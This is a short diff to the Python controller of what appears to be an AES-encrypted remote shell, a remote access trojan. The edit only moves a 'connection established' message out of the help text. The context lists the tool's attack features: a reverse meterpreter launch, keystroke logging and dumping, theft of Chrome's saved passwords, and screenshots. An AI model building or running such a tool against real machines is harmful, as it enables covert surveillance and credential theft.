@@ -325,7 +325,7 @@ def fnextcmd():
 		s.send(encrypted)
 
 def fhelp():
-	return ' [*] AES-Encrypted connection established with %s:%s**n**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot**n' % (address[0],address[1])
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot**n'
 
 commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'screenshot']
 readline.parse_and_bind("tab: complete")
@@ -367,6 +367,7 @@ while True:
 		fnextcmd()
 
 	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
+		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
 		print fhelp()
 		fnextcmd()
 
